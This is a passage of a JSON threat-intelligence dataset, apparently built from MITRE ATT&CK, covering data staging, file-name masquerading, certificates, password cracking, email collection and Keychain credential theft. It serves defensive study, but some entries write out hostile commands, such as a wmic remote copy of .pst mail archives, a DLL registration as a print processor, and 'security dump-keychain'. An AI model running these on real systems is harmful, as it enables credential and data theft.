      "can stage stolen browser data in `C:\\\\Windows\\\\Temp\\\\cup.tmp` and keylogger data in `C:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK`.",
      "has been known to stage files for exfiltration in a single location.",
      "has stored stolen emails and other data into new folders prior to exfiltration.",
      "can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows\\.",
      "can save files to be evaluated for further exfiltration in the `C:\\Programdata\\Microsoft\\` and `C:\\windows\\temp\\` folders.",
      "can temporarily store files in a hidden directory on the local host.",
      "has staged ZIP files in local directories such as `C:\\PerfLogs\\1\\` and `C:\\User\\1\\` prior to exfiltration.",
      "has stored collected information in the Application Data directory on a compromised host.",
      "has saved information to a random temp file before exfil.",
      "saves information from its keylogging routine as a .zip file in the present working directory.",
      "creates folders to store output from batch scripts prior to sending the information to its C2 server.",
      "copies files from removable drives to C:\\system.",
      "identifies files with certain extensions and copies them to a directory in the user's profile.",
      "creates a file in AppData\\Local\\Microsoft\\Windows\\Explorer and stores all harvested data in that file.",
      "can store harvested data in a custom database under the %TEMP% directory.",
      "has staged collected data files under C:\\Program Files\\Common Files\\System\\Ole DB\\.",
      "has utilized tools to aggregate data prior to exfiltration.",
      "compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.",
      "stored targeted SMS messages that matched its target list in CSV files on the compromised system.",
      "stores the gathered data from the machine in .db files and .bmp files under four separate locations.",
      "Data captured by  is placed in a temporary file under a directory named memdump.",
      "can store copied files in a specific directory prior to exfiltration.",
      "has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.",
      "can copy specific files webcam captures and screenshots to local directories.",
      "stages data prior to exfiltration in multi-part archives often saved in the Recycle Bin.",
      "has copied files of interest to the main drive's recycle bin.",
      "stores all collected information in a single file before exfiltration.",
      "can collect data from the victim and stage it in LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp.",
      "can store collected data locally in a created .nfo file.",
      "has stored collected credential files in c:\\windows\\temp prior to exfiltration.  has also stored documents for exfiltration in a hidden folder on USB drives.",
      "creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.",
      "specifies a path to store files scheduled for exfiltration.",
      "can stage files in a central location prior to exfiltration.",
      "has copied captured files and keystrokes to the `%TEMP%` directory of compromised hosts.",
      "copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory.",
      "uses a hidden directory named .calisto to store data from the victims machine before exfiltration.",
      "can save collected system information to a file named info before exfiltration.",
      "has staged stolen files in the C:\\AMD\\Temp directory.",
      "creates a directory %USERPROFILE%\\AppData\\Local\\SKC\\ which is used to store collected log files.",
      "stages command output and collected data in files before exfiltration.",
      "has temporarily stored collected information to the files `%AppData%\\{Unique Identifier}\\HOSTRURKLSR` and `%AppData%\\{Unique Identifier}\\NEWERSSEMP`.",
      "can send output from `whoami` to a local temp file using the naming convention `rad<5-hex-chars>.tmp`.",
      "has created a directory named out in the user's %AppData% folder and copied files to it.",
      "has created a working folder for collected files that it sends to the C2 server.",
      "has the ability to write collected data to a file created in the ./LOGS directory.",
      "stages data it copies from the local system or removable drives in the %WINDIR%\\$NtUninstallKB885884$\\ directory.",
      "has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: `C:\\Windows\\Temp` and `/tmp`.",
      "has stored captured credential information in a file named pi.log.",
      "has piped the results from executed C2 commands to `%TEMP%\\result2.dat` on the local machine.",
      "collects data in a plaintext file named r1.log before exfiltration.",
      "has stored collected data in a file called `stari.txt`.",
      "aggregates collected data in a tmp file.",
      "has stored keystrokes and screenshots within the %temp%\\GoogleChrome %temp%\\Downloads and %temp%\\TrendMicroUpdate directories.",
      "has saved stolen files including the ntds.dit database and the `SYSTEM` and `SECURITY` Registry hives locally to the `C:\\Windows\\Temp\\` directory.",
      "has written extracted data to `tmp/dsserver-check.statementcounters`.",
      "collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.",
      "can store captured screenshots to disk including to a covert store named `APPX.%x%x%x%x%x.tmp` where `%x` is a random value.",
      "has staged collected application data from Safari Notes and Keychain to `/var/folder`.",
      "has stored collected data in a .tmp file.",
      "has used the folder C:\\\\windows\\\\temp\\\\s\\\\ to stage data for exfiltration.",
      "involved exporting data from Oracle databases to local CSV files prior to exfiltration.",
      "staged captured credentials locally at `/tmp/.temp.data`.",
      "has saved stolen files including the `ntds.dit` database and the `SYSTEM` and `SECURITY` Registry hives locally to the `C:\\Windows\\Temp\\` directory.",
      "can create a directory in `%TEMP%\\` to stage data prior to exfilration.",
      "has locally staged captured credentials for subsequent manual exfiltration.",
      "stored captured credential material on local log files on victim systems during .",
      "encrypts gathered information on victim devices prior to exfiltrating it through command and control infrastructure.",
      "has locally staged compressed and archived data for follow-on exfiltration.",
      "During   staged captured credential information in the C:\\ProgramData directory.",
      "has configured a custom user data directory such as a folder within `%USERPROFILE%\\AppData\\Roaming` for staging data.",
      "During   used browser data and credential stealer tools to stage stolen files named Cupdate Eupdate and IUpdate in the %TEMP% directory.",
      "can log the output from C2 commands in an encrypted and compressed format on disk prior to exfiltration.",
      "During  threat actors copied files to the web application folder on compromised devices for exfiltration.",
      "gathers host information and stages it locally as a RAR file prior to exfiltration.  stores logged data in an encrypted file located at `%TEMP%/TS_FB56.tmp` during execution.",
      "can stage files in the `tempFiles` directory for exfiltration."
    ],
    "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
    "similar_words": [
      "Local Data Staging"
    ],
    "id": "T1074.001"
  },
  "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2": {
    "name": "Match Legitimate Resource Name or Location",
    "example_uses": [
      "saves itself as a file named `msdtc.exe` which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.",
      "has used names to mimic legitimate software including vmtoolsd.exe to spoof Vmtools.",
      "has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.",
      "has been downloaded as a file named lsass.exe which matches the legitimate Windows file.",
      "has been named `wuauclt.exe` to appear as the legitimate Windows Update AutoUpdate Client.",
      "has mimicked the names of known executables such as mediaplayer.exe.",
      "If installing itself as a service fails  instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.",
      "uses the filename owaauth.dll which is a legitimate file that normally resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\.",
      "During the  DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.",
      "has disguised a malicious .app file as a Flash Player update.",
      "may save itself as a file named `msdtc.exe` which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.",
      "files have been named `UltraVNC.exe` and `WINVNC.exe` to appear as legitimate VNC tools.",
      "can rename its running process to  has also named RC scripts used for persistence after WatchGuard artifacts.",
      "has used legitimate process names to hide malware including svchosst.",
      "has been deployed as `w64time.dll` to appear legitimate.",
      "has masqueraded as Windows system file names as well as chkntfs.exe and syscron.exe.",
      "has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe cl64.exe vm3dservice.exe watchdogd.exe Win.exe WmiPreSV.exe and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.",
      "has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.",
      "has used the Adobe Reader icon for the downloaded file to look more trustworthy.",
      "has chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper.",
      "has used file names to mimic legitimate Windows files or system functionality.",
      ".NET assemblies have used `App_Web_` in their file names to appear legitimate.",
      "has masqueraded as legitimate Adobe Content Management System files.",
      "attempted to masquerade their files as popular anti-virus software.",
      "can mimic the names of known executables.",
      "has named malicious browser extensions and update files to appear legitimate.",
      "used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.",
      "has attempted to run Darkside ransomware with the filename sleep.exe.",
      "In the   renamed files to look like legitimate files such as Windows update files or Schneider Electric application files.",
      "has created a fake rm binary to replace the legitimate Linux binary.",
      "has used legitimate looking filenames for its loader including update.dll and x64.dll.",
      "For  the threat actors renamed a  payload to `vmware_kb.exe`.",
      "During the   renamed software and DLLs with legitimate names to appear benign.",
      "has used the filename `AutoUpdater.js` to mimic legitimate update files and has also used the Cyrillic homoglyph characters  `(0xd0a1)` and  `(0xd0b0)` to produce the filename `hrome.Updte.zip`.",
      "has masqueraded as executable files such as `winupdate.exe` `date.exe` or `win.exe`.",
      "installs itself in %ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter o.",
      "has downloaded a DLL to the C:\\windows\\system32\\drivers\\ folder and renamed it with a .sys extension.",
      "has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.",
      "has dropped  under the `svchost.exe` name to disk.",
      "has named a first stage dropper `Kaspersky Update Agent` in order to appear legitimate.",
      "installed its payload in the startup programs folder as Baidu Software Update. The group also adds its second stage payload to the startup programs as Net Monitor. They have also dropped  binaries as files named microsoft_network.exe and crome.exe.",
      "has attempted to hide its payload by using legitimate file names such as iconcache.db.",
      "has been named `exec_32.dll` to mimic a legitimate MS Outlook .dll.",
      "has masqueraded as VMware.exe.",
      "The  loader implements itself with the name Security Support Provider a legitimate Windows function. Various  .exe files mimic legitimate file names used by Microsoft Symantec Kaspersky Hewlett-Packard and VMWare.  also disguised malicious modules using similar filenames as custom network encryption software on victims.",
      "has been installed to `C:\\Temp\\TrustedInstaller.exe` to mimic a legitimate Windows installer service.",
      "was installed under names that resembled legitimate Windows file and directory names.",
      "can mimic legitimate Windows directories by using the same icons and names.",
      "actors used the following command to rename one of their tools to a benign file name: ren %temp%\\upload audiodg.exe",
      "During the  campaign  renamed files to look like legitimate files such as Windows update files or Schneider Electric application files.",
      "used the command `move [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll` to move and register a malicious DLL name as a Windows print processor which eventually was loaded by the Print Spooler service.",
      "saves itself as a file named `msdtc.exe` which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.",
      "has dropped implants in folders named for legitimate software.",
      "has masqueraded as a legitimate Windows tool.",
      "has masqueraded as a Flash Player installer through the executable file install_flash_player.exe.",
      "One of  can hide in replicas of legitimate programs like OllyDbg 7-Zip and FileZilla.",
      "has named malicious files update.exe and loaded them into the compromise host's Public folder.",
      "has been named `CrashReporter.exe` to appear as a legitimate Mozilla executable.",
      "mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.",
      "has been disguised as legitimate programs such as Java and Telegram Messenger.",
      "has constructed legitimate appearing installation folder paths by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. For Windows Vista or higher the path would appear as C:\\Users\\Public.",
      "installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.",
      "has used a payload file named OneDrive.update to appear benign.",
      "is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.",
      "has used filenames associated with Exchange and Outlook for binary and configuration files such as winmail.dat.",
      "has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.",
      "has changed extensions on files containing exfiltrated data to make them appear benign and renamed a web shell instance to appear as a legitimate OWA page.",
      "During  the threat actors renamed a malicious executable to `rundll32.exe` to allow it to blend in with other Windows system files.",
      "has mimicked the Cron binary to hide itself on compromised systems.",
      "has a C2 proxy tool that masquerades as GUP.exe which is software used by Notepad++.",
      "setup file installs initial executables under the folder %WinDir%\\System32\\PluginManager.",
      "has disguised malicious programs as Google Chrome Adobe and VMware executables.",
      "has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.",
      "has been named `AutoUpdater.js` to mimic legitimate update files.",
      "can use variations of Microsoft and Outlook spellings such as Microsift in its file names to avoid detection.",
      "has used strings from legitimate system files and existing folders for its file folder and Registry entry names.",
      "renamed payloads to masquerade as legitimate Google Chrome Java Dropbox Adobe Reader and Python executables.",
      "has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe RecordedTV.ms teredo.tmp update.exe and msadcs1.exe.",
      "prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.",
      "spoofed itself as AlphaZawgyl_font.exe a specialized Unicode font.",
      "The  loader has named malicious shortcuts adobe and mimicked communications software.",
      "The  main executable has disguised itself as Microsofts Narrator.",
      "has been named `Flash.exe` and its dropper has been named `IExplorer`.",
      "has named component DLLs RapportGP.dll to match those used by the security company Trusteer.",
      "has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update.  has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe.",
      "has been named Readme.txt to appear legitimate.",
      "has been named `calc.exe` to appear as a legitimate calculator program.",
      "created VBScripts that were named after existing services or folders to blend into legitimate activities.",
      "has dropped their malware into legitimate installed software paths including: `C:\\ProgramFiles\\Realtek\\Audio\\HDA\\AERTSr.exe` `C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe` `C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe` and `C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe`.",
      "used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.",
      "has masqueraded as a 7zip installer.",
      "During   used file names beginning with USERS SYSUSER and SYSLOG for  and changed  file extensions from .vmp to .upx likely to avoid hunting detections.",
      "has hidden payloads in Flash directories and fake installer files.",
      "has used `dllhost.exe` to mask Fast Reverse Proxy (FRP) and `MicrosoftOutLookUpdater.exe` for Plink.",
      "has masqueraded as a legitimate SolarWinds DLL.",
      "has been disguised as legitimate Adobe and PotPlayer files.",
      "can masquerade as a Flash Player update.",
      "has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.",
      "has used an unsigned crafted DLL module named hha.dll that was designed to look like a legitimate 32-bit Windows DLL.",
      "has disguised malicious installer files by bundling them with legitimate software installers.",
      "has used fake icons including antivirus and external drives to disguise malicious payloads.",
      "binaries have been named `audioddg.pdb` and `Winlangdb.pdb` in order to appear legitimate.",
      "can be disguised as a Visual Studio file such as `Windows.Data.TimeZones.zh-PH.pri` to evade detection. Also 's loader can mimic a genuine `dll` file that carries out the same import functions as the legitimate Windows `version.dll` file.",
      "has masqueraded as legitimate software including TeamViewer and macOS Finder.",
      "mimics a legitimate Russian program called USB Disk Security.",
      "can masquerade as update.exe and svehost.exe; it has also mimicked legitimate Telegram and Chrome files.",
      "During  the threat actors renamed some tools and executables to appear as legitimate programs.",
      "has disguised their exfiltration malware as `ZoomVideoApp.exe`.",
      "has used the name `postgressql.exe` to mask a malicious payload.",
      "has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.",
      "uses functions named StartUserModeBrowserInjection and StopUserModeBrowserInjection indicating that it's trying to imitate chrome_frame_helper.dll.",
      "MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.",
      "has been disguised as legitimate software programs associated with the travel and airline industries.",
      "files had names that resembled legitimate Window file and directory names.",
      "has named malware svchost.exe which is the name of the Windows shared service host program.",
      "During  the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.",
      "has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.",
      "has disguised a file as a Linux kernel module.",
      "was identified on disk with a filename of taskhostsvc.exe and it created an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log.",
      "has used filenames that matched the system name and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.",
      "attempts to hide its payloads using legitimate filenames.",
      "To establish persistence  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an Office Start Yahoo Talk MSN Gaming Z0ne or MSN Talk shortcut.",
      "has used malware that is disguised as a Secure Shell (SSH) tool.",
      "The file name AcroRD32.exe a legitimate process name for Adobe's Acrobat Reader was used by  as a name for malware.",
      "renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.",
      "has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.",
      "has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable.",
      "has been disguised as a legitimate executable including as Windows SDK.",
      "has used the filename `systemd-daemon` in an attempt to appear legitimate.",
      "chooses its payload creation path from a randomly selected service name from netsvc.",
      "variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.",
      "installation file is an unsigned DMG image under the guise of Integos security solution for mac.",
      "has used a DLL named Goopdate.dll to impersonate a legitimate Google update file.",
      "uses file and folder names related to legitimate programs in order to blend in such as HP Intel Adobe and perflogs.",
      "has been seen changing malicious files to appear legitimate.",
      "has created the directory `%COMMONPROGRAMFILES%\\Microsoft Shared\\wmi\\` to contain DLLs for loading successive stages.",
      "has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive WhatsApp or Spotify for example.",
      "named its tools to masquerade as Windows or Adobe Reader software such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security.",
      "has executed a malicious executable by naming it svchost.exe.",
      "has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications closely mimicking a legitimate McAfee file mfevtps.exe.",
      "The  dropper has mimicked an application for creating USB bootable drivers.",
      "has renamed malware to legitimate names such as ESTCommon.dll or patch.dll.",
      "has been disguised as a Growl help file.",
      "has named exfiltration archives to mimic Windows Updates at times using filenames with a `KB<digits>.zip` pattern.",
      "has masqueraded as trusted software rsyncd and dbus-inotifier.",
      "tools attempt to spoof anti-virus processes as a means of self-defense.",
      "has named its backdoor WINWORD.exe.",
      "has used the name `eoffice.exe` in attempt to appear as a legitimate file.",
      "has named binaries and configuration files svhost and dllhost respectively to appear legitimate.",
      "copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).",
      "A  implant file was named ASPNET_FILTER.DLL mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.",
      "has used the name `debug.exe` for malware components.",
      "has impersonated the legitimate goopdate.dll which was dropped on the target system with a legitimate GoogleUpdate.exe.",
      "has used a legitimate DLL file name `Duser.dll` to disguise a malicious remote access tool.",
      "has renamed malicious code to `msacm32.dll` to hide within a legitimate library; earlier versions were disguised as `winhelp`.",
      "has used registry values and file names associated with Adobe software such as AcroRd32.exe.",
      "has hidden malicious payloads in %USERPROFILE%\\Adobe\\Driver\\dwg\\ and mimicked the legitimate DHCP service binary.",
      "has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs.",
      "modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.",
      "has used names like `adobeupdate.dat` and `PotPlayerDB.dat` to disguise  and a file named `OneDrive.exe` to load a  payload.",
      "has been bundled with legitimate software installation files for disguise.",
      "has named malicious binaries `serv.exe` `winprint.dll` and `chrome_elf.dll` and has set its persistence in the Registry with the key value Chrome Update to appear legitimate.",
      "has created a shortcut called Anti virus service.lnk in an apparent attempt to masquerade as a legitimate file.",
      "has masqueraded WAR files to look like legitimate packages such as wsexample.war wsexamples.com examples.war and exampl3s.war.",
      "has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.",
      "has been disguised as update.exe to appear as a valid executable.",
      "During  threat actors installed  in the Startup folder and disguised it as `mssync.exe`.",
      "has disguised its droppers as legitimate software or documents matching their original names and locations and saved its files as mpr.dll in the Windows folder.",
      "mimics the resource version information of legitimate Realtek Semiconductor Nvidia or Synaptics modules.",
      "has attempted to change its name to `cron` upon startup. During incident response  samples have been identified that were renamed to blend in with other legitimate files.",
      "has avoided detection by naming a malicious binary explorer.exe.",
      "has used shell scripts which download mining executables and saves them with the filename java.",
      "has modified legitimate .dll files to include malicious code.",
      "is often disguised as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.",
      "mimicked legitimate file names and scheduled tasks e.g. ` MicrosoftCurrentupdatesCheck` and`MdMMaintenenceTask` to mask malicious files and scheduled tasks.",
      "has copied and renamed itself to DumpMediaSpotifyMusicConverter.",
      "renamed or moved malicious binaries to legitimate locations to evade defenses and blend into victim environments.",
      "has been packed to appear as a component to Bitdefenders kernel-mode driver TRUFOS.SYS.",
      "has named a  executable winupd to mimic a legitimate Windows update file.",
      "During  threat actors renamed  to GoXML.exe and  to cl.exe.",
      "has renamed tools to match legitimate utilities such as renaming GOST tunneling instances to `java` in victim environments.",
      "has named components of  to mimic Zabbix agent logs.",
      "attempts to download and execute  to a statically-defined location attempting to mimic svchost: %TEMP%\\\\svjhost.exe.",
      "can rename itself as [nfsiod 0] to masquerade as the local Network File System (NFS) asynchronous I/O server.",
      "has masqueraded the VINETHORN payload as a VPN application.",
      "has disguised  installers as a malicious DLL masquerading as part of a legitimate 7zip installation package.",
      "stores configuration data in files and file paths mimicking legitimate operating system resources.",
      "has used legitimate names and locations for files to evade defenses.",
      "is typically installed via a dropper file that masquerades as a legitimate security program installation file.",
      "During the  threat actors used the name JunoscriptService to masquerade malware as the Junos automation scripting service.",
      "payloads have tailored filenames to include names identical to the name of the targeted organization or company.",
      "has been named `GoogleTranslate.crx` to masquerade as a legitimate Chrome extension.",
      "has named a downloaded copy of the Plink tunneling utility as \\ProgramData\\Adobe.exe.",
      "is installed through droppers masquerading as legitimate signed software installers.",
      "used a malicious DLL `iviewers.dll` that mimics the legitimate OLE/COM Object Viewer within Windows."
    ],
    "description": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",
    "similar_words": [
      "Match Legitimate Name or Location",
      "Match Legitimate Resource Name or Location"
    ],
    "id": "T1036.005"
  },
  "attack-pattern--1cec9319-743b-4840-bb65-431547bce82a": {
    "name": "Digital Certificates",
    "example_uses": [
      "has created self-signed digital certificates to enable mutual TLS authentication for malware.",
      "has created self-signed digital certificates for use in HTTPS C2 traffic.",
      "For   established SSL certificates on the typo-squatted domains the group registered.",
      "included acquiring digital certificates mimicking patterns associated with Cisco ASA appliances for command and control infrastructure.",
      "During the  threat actors used self-signed certificates on VPS C2 infrastructure."
    ],
    "description": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
    "similar_words": [
      "Digital Certificates"
    ],
    "id": "T1587.003"
  },
  "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292": {
    "name": "Stored Data Manipulation",
    "example_uses": [
      "created a copy of the SolarWinds Orion software source file with a .bk extension to backup the original content wrote  using the same filename but with a .tmp extension and then moved  using MoveFileEx to the original filename with a .cs extension so it could be compiled within Orion software.",
      "has used DYEPACK to create delete and alter records in databases used for SWIFT transactions.",
      "changes the original path information of deleted files to make recovery efforts more difficult."
    ],
    "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "similar_words": [
      "Stored Data Manipulation"
    ],
    "id": "T1565.001"
  },
  "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d": {
    "name": "Password Cracking",
    "example_uses": [
      "has been known to brute force password hashes to be able to leverage plain text credentials.",
      "uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.",
      "has dropped and executed tools used for password cracking including Hydra and .",
      "performed password brute-force attacks on the local admin account.",
      "has extracted password hashes from ntds.dit to crack offline.",
      "During  threat actors used Cain & Abel to crack password hashes.",
      "has cracked passwords for accounts with weak encryption obtained from the configuration files of compromised network devices."
    ],
    "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
    "similar_words": [
      "Password Cracking"
    ],
    "id": "T1110.002"
  },
  "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004": {
    "name": "Local Email Collection",
    "example_uses": [
      "searches through Outlook files and directories (e.g. inbox sent templates drafts archives etc.).",
      "can target and steal locally stored emails to support thread hijacking phishing campaigns.",
      "can interact with a victims Outlook session and look through folders and emails.",
      "searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.",
      "uses two utilities GETMAIL and MAPIGET to steal email. GETMAIL extracts emails from archived Outlook .pst files.",
      "contains a command to collect and exfiltrate emails from Outlook.",
      "During  threat actors used RAT malware to exfiltrate email archives.",
      "has the ability to collect emails on a target system.",
      "has harvested data from victim's e-mail including through execution of wmic /node:<ip> process call create cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst copy i:\\<path>\\<username>\\My Documents\\<filename>.pstcopy.",
      "can harvest data from mail clients.",
      "has collected .PST archives.",
      "searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.",
      "can parse e-mails on a target machine.",
      "has been observed leveraging a module that scrapes email data from Outlook.",
      "can capture the recipients of sent email messages from compromised accounts.",
      "has collected emails to use in future phishing campaigns.",
      "delivered malicious JavaScript payloads capable of exfiltrating email messages from exploited email servers.",
      "collected email archives from victim environments."
    ],
    "description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a users local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)",
    "similar_words": [
      "Local Email Collection"
    ],
    "id": "T1114.001"
  },
  "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3": {
    "name": "Keychain",
    "example_uses": [
      "can use Keychain Services API functions to find and collect passwords such as `SecKeychainFindInternetPassword` and `SecKeychainItemCopyAttributesAndData`.",
      "gathers credentials in files for keychains.",
      "can dump credentials from the macOS keychain.",
      "can obtain credentials from macOS Keychains.",
      "collects Keychain storage data and copies those passwords/tokens to a file.",
      "collects the keychains on the system.",
      "can capture files from a targeted user's keychain directory.",
      "performs an in-memory keychain query via `SecItemCopyMatching()` then formats the retrieved data as a JSON blob for exfiltration."
    ],
    "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apples iCloud service. Keychains can be viewed and edited through the Keychain Access application or using the command-line utility security. Keychain files are located in ~/Library/Keychains/, /Library/Keychains/, and /Network/Library/Keychains/.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)Adversaries may gather user credentials from Keychain storage/memory. For example, the command security dump-keychain d will dump all Login Keychain credentials from ~/Library/Keychains/login.keychain-db. Adversaries may also directly read Login Keychain credentials from the ~/Library/Keychains/login.keychain file. Both methods require a password, where the 